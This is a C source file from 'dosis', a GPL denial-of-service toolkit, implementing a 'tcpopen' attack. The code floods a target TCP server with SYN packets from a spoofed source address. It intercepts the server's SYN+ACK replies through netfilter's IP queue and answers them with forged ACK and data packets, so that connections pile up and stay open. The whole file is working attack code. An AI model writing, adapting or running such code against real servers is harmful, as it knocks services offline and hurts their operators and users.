/*****************************************************************************
 * tcpopen.c
 *
 * DoS on TCP servers by leaving connections opened.
 *
 * ---------------------------------------------------------------------------
 * dosis - DoS: Internet Sodomizer
 *   (C) 2008 Gerardo García Peña <gerardo@kung-foo.dhs.org>
 *
 *   This program is free software; you can redistribute it and/or modify it
 *   under the terms of the GNU General Public License as published by the Free
 *   Software Foundation; either version 2 of the License, or (at your option)
 *   any later version.
 *
 *   This program is distributed in the hope that it will be useful, but WITHOUT
 *   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 *   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 *   more details.
 *
 *   You should have received a copy of the GNU General Public License along
 *   with this program; if not, write to the Free Software Foundation, Inc., 51
 *   Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *****************************************************************************/

#include <config.h>

#include "dosis.h"
#include "dosconfig.h"
#include "tea.h"
#include "tcpopen.h"
#include "lnet.h"
#include "ipqex.h"
#include "pthreadex.h"
#include "log.h"
#include "ip.h"

#define BUFSIZE    2048

typedef struct _tag_TCPOPEN_CFG {
  INET_ADDR  shost;
  INET_ADDR  dhost;
  unsigned   npackets;
  char      *req;
  unsigned   req_size;
} TCPOPEN_CFG;

typedef struct _tag_TCPOPEN_WORK {
  THREAD_WORK  *w;
  LN_CONTEXT    lnc;
  ipqex_msg_t   msg;
  TCPOPEN_CFG   cfg;
} TCPOPEN_WORK;

static ipqex_info_t        attack_tcpopen__ipq;
static pthreadex_flag_t    attack_flag;

/*****************************************************************************
 * LISTENER THREAD
 *****************************************************************************/

static void listener_thread(TCPOPEN_WORK *tw)
{
  int status;

  /* initialize pcap library */
  DBG("[LL_%02u] Initializing IPQ message...", tw->w->id);
  if(ipqex_msg_init(&(tw->msg), &attack_tcpopen__ipq))
    FAT("[LL_%02u] Cannot initialize IPQ message.", tw->w->id);

  /* listen the radio */
  while(!cfg.finalize)
  {
    if((status = ipqex_msg_read(&(tw->msg), 0)) <= 0)
    {
      if(status < 0)
        ERR("[LL_%02u] Error reading from IPQ: %s",
            tw->w->id, ipq_errstr());
    } else {
      /* but ... in some circumstances ... */
      if(ipqex_get_ip_header(&(tw->msg))->protocol == 6
      && ipqex_get_ip_header(&(tw->msg))->daddr == tw->cfg.shost.addr.in.addr
      && ipqex_get_tcp_header(&(tw->msg))->source == tw->cfg.dhost.port)
      {
        DBG("[LL_%02u] Received a spoofed connection packet.", tw->w->id);
        /*
        DBG2("[LL_%02u] Dropped << %d - %d.%d.%d.%d:%d/%d (rst=%d) => [%08x/%08x] >>",
                tw->w->id,
                ipqex_identify_ip_protocol(&(tw->msg)),
                (ipqex_get_ip_header(&(tw->msg))->saddr >>  0) & 0x00ff,
                (ipqex_get_ip_header(&(tw->msg))->saddr >>  8) & 0x00ff,
                (ipqex_get_ip_header(&(tw->msg))->saddr >> 16) & 0x00ff,
                (ipqex_get_ip_header(&(tw->msg))->saddr >> 24) & 0x00ff,
                ipqex_get_tcp_header(&(tw->msg))->dest, cfg->dhost.port,
                ipqex_get_tcp_header(&(tw->msg))->rst,
                ipqex_get_ip_header(&(tw->msg))->saddr,
                cfg->shost.s_addr);
        */

        /* ignore any packet that have anything to do with this connection */
        if(ipqex_set_verdict(&tw->msg, NF_DROP) <= 0)
          ERR("[LL_%02u] Cannot DROP IPQ packet.", tw->w->id);

        /* in some special case (handshake) send kakitas */
        if(ipqex_get_tcp_header(&(tw->msg))->syn != 0
        && ipqex_get_tcp_header(&(tw->msg))->ack != 0)
        {
          /* send handshake and data TCP packet */
          DBG("[LL_%02u]   - Request packet sending...", tw->w->id);
          ln_send_packet(&(tw->lnc),
                         &tw->cfg.shost.addr.in.inaddr, ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
                         &tw->cfg.dhost.addr.in.inaddr, tw->cfg.dhost.port,
                         TH_ACK,
                         ntohs(ipqex_get_tcp_header(&(tw->msg))->window),
                         ntohl(ipqex_get_tcp_header(&(tw->msg))->ack_seq),
                         ntohl(ipqex_get_tcp_header(&(tw->msg))->seq) + 1,
                         NULL, 0);
          ln_send_packet(&(tw->lnc),
                         &tw->cfg.shost.addr.in.inaddr, ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
                         &tw->cfg.dhost.addr.in.inaddr, tw->cfg.dhost.port,
                         TH_ACK | TH_PUSH,
                         ntohs(ipqex_get_tcp_header(&(tw->msg))->window),
                         ntohl(ipqex_get_tcp_header(&(tw->msg))->ack_seq),
                         ntohl(ipqex_get_tcp_header(&(tw->msg))->seq) + 1,
                         (char *) tw->cfg.req, tw->cfg.req_size);
        }
      } else
        /* policy: accept anything unknown */
        if(ipqex_set_verdict(&tw->msg, NF_ACCEPT) <= 0)
          ERR("[LL_%02u] Cannot ACCEPT IPQ packet.", tw->w->id);
    }
  }
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * SENDER THREADS
 *   This thread processes all packets coming from NETFILTER/IP_QUEUE and
 *   add more packages to the queue when we have to answer to some SYN+ACK
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

static void sender_thread(TCPOPEN_WORK *tw)
{
  unsigned int seq = libnet_get_prand(LIBNET_PRu32);
  int npackets, i;

  DBG("[SS_%02u] Started sender thread", tw->w->id);

  /* set how many packets will be sent by this thread */
  npackets = tw->cfg.npackets;

  /* ATTACK */
  while(!cfg.finalize)
  {
    /* wait for work */
    pthreadex_flag_wait(&attack_flag);

    /* build TCP packet with payload (if requested) */
    DBG("[SS_%02u] Sending %d packets...", tw->w->id, npackets);
    for(i = 0; i < npackets; i++)
    {
      seq += libnet_get_prand(LIBNET_PRu16) & 0x00ff;
      ln_send_packet(&tw->lnc,
                     &tw->cfg.shost.addr.in.inaddr, libnet_get_prand(LIBNET_PRu16),
                     &tw->cfg.dhost.addr.in.inaddr, tw->cfg.dhost.port,
                     TH_SYN, 13337,
                     seq, 0,
                     NULL, 0);
    }
  }
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * GENERIC HHTP THREAD
 *   This thread specializes in different tasks depending on thread number
 *     0 - listener
 *     x - sender
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

static void attack_tcpopen__thread_cleanup(TCPOPEN_WORK *tw)
{
  /* collect libnet data */
  ln_destroy_context(&(tw->lnc));

  /* close ipq (if this is a listener thread) */
  if(tw->w->id < cfg->l)
  {
    DBG("[MM_%02u] Freeing IPQ message...", tw->w->id);
    ipqex_msg_destroy(&(tw->msg));
  }

  DBG("[MM_%02u] Finalized.", tw->w->id);
}

static void attack_tcpopen__thread(THREAD_WORK *w)
{
  int r;
  TCPOPEN_WORK tw;

  /* initialize specialized work thread data */
  memset(&tw, 0, sizeof(tw));
  tw.w = w;

  /* initialize thread */
  pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, &r);
  pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, &r);
  pthread_cleanup_push((void *) attack_tcpopen__thread_cleanup, &tw);

  /* initialize libnet */
  DBG("[MM_%02u] Initializing libnet.", tw.w->id);
  ln_init_context(&(tw.lnc));

  /* wait 4 start */
  pthreadex_barrier_wait(w->start);

  /* launch specialized thread */
  if(w->id < cfg->l)
    listener_thread(&tw);
  else
    sender_thread(&tw);

  pthread_cleanup_pop(1);
  pthread_exit(NULL);
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * GO4WORK
 *   Function to enqueue SYN packets.
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

static int attack_tcpopen__go2work(void)
{
  return pthreadex_flag_up(&attack_flag);
}

void attack_tcpopen(void)
{
  /* initialize */
  DBG("Initializing IPQ...");
  if(ipqex_init(&attack_tcpopen__ipq, BUFSIZE))
    FAT("  !! Cannot initialize IPQ.");

  /* flag that will keep attack threads waiting for work */
  pthreadex_flag_init(&attack_flag, 0);

  /* launch attack */
  tea_timer(attack_tcpopen__go2work, attack_tcpopen__thread);

  /* finalize ipq */
  ipqex_destroy(&attack_tcpopen__ipq);
}

